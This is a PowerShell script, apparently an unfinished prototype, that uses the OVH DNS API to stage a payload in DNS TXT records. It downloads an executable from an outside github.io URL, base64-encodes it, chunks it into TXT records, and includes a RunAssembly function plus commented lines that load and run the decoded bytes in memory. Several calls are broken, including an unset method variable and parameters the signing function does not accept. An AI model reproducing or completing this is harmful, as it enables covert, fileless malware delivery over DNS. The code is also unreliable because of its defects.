# OVH cred API
# ----------------------------------------------------------------------------
$global:endpoint=""
$global:AK = ""
$global:AS = ""
$global:CK = ""
$global:TIME = [DateTimeOffset]::Now.ToUnixTimeSeconds()
# ----------------------------------------------------------------------------

function RunAssembly{
    param (
        [Byte[]]$bytes
    )

    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, $null)
}

function GetOVHSignatureFromQuery{
    param (
        [String[]]$Method,
        [String[]]$Query,
        [String[]]$Body
    )
    $Sha = "$AS+$CK+$Method+$Query+$Body+$TIME"
    # Get Hash from String
    $Stream = [System.IO.MemoryStream]::new()
    $writer = [System.IO.StreamWriter]::new($Stream)
    $writer.write($Sha)
    $writer.Flush()
    $Stream.Position = 0
    $Hash = Get-FileHash -Algorith SHA1 -InputStream $Stream | foreach { $_.Hash}

    $Signature = '$1$'+$Hash
    $Signature = $Signature.ToLower()
    # Write-Output("Signature : " + $Signature)
    return($Signature)
}

Write-Output("1. Test Connection")
Write-Output("2. Write DNS Record")
Write-Output("3. Delete DNS Record")

$Choice = Read-Host("What action do you want to proceed ?")

Switch($Choice){

    1{ # Test Connection
        
        $QUERY = "https://api.ovh.com/1.0/me" 
        $METHOD = "GET"
        $BODY = ""
        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
        Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY
    
    }

    2{ # Write DNS Record
        
        # Récupération du payload
        $url = "https://hakkyahud.github.io/HelloWorldCS.exe"
        $bytes = (New-Object Net.WebClient).DownloadData($url)

        # Convert to base64
        $base64 = [System.Convert]::ToBase64String($bytes)

        # Subdomain calculation
        $subDomainNumber = [math]::Ceiling($base64.Length/254)
        Write-Output("Number of SUBDOMAIN : {0}" -f $subDomainNumber)
        $QUERY = "https://api.ovh.com/1.0/domain/zone"
        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
        Write-Output("Get Domain")
        $DOMAIN = Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json
        Write-Output("DOMAIN : {0}" -f $DOMAIN)

        # Write DNS records
        $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record" -f $DOMAIN
        $METHOD = "POST"
        $i = 0

        $subString = $base64.Substring($i*254,254)
        $BODY = @{"fieldType"="TXT"; "subDomain"="test"; "target"="aa"} | ConvertTo-Json
        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY
        Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY -Uri $QUERY



        #For ($i = 0; $i -lt $subDomainNumber; $i++){
         #   $subString = $base64.Substring($i*254,254)
         #   $BODY = @{"fieldType"="TXT"; "subDomain"=str($i); "target"=$subString}
         #   $SIGNATURE = GetOVHSignatureFromQuery -ApplicationSecret $AS -ConsumerKey $CK -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
         #   Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Body $BODY $QUERY
        #}
    }

    3{ # Delete DNS Record

        # First get the ID of record to be deleted
        $i = "test"
        $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record?fieldType=TXT&subDomain={1}" -f $DOMAIN, $i
        $METHOD = "GET"
        $BODY = ""
        $SIGNATURE = GetOVHSignatureFromQuery -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
        $RecordID = Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY | ConvertFrom-Json

        # Delete DNS record from the retrieved IDs
        For ($i = 0; $i -lt $RecordID.Length; $i++){
            Write-Output($RecordID[$i])
            $METHOD = "DELETE"
            $QUERY = "https://api.ovh.com/1.0/domain/zone/{0}/record/{1}" -f $DOMAIN, $RecordID[$i]
            $SIGNATURE = GetOVHSignatureFromQuery -ApplicationSecret $AS -ConsumerKey $CK -Method $METHOD -Query $QUERY -Body $BODY -Time $TIME
            Invoke-WebRequest -Method $METHOD -Headers @{"Content-type"="application/json"; "X-Ovh-Application"=$AK; "X-Ovh-Consumer"=$CK; "X-Ovh-Signature"=$SIGNATURE; "X-Ovh-Timestamp"=$TIME} -Uri $QUERY
        }

    }

    Default {Write-Output("Wrong choice, bye.")}

}





# $bytes2 = [System.Convert]::FromBase64String($base64)
# RunAssembly($bytes2)

# Send base64 payload to DNS server





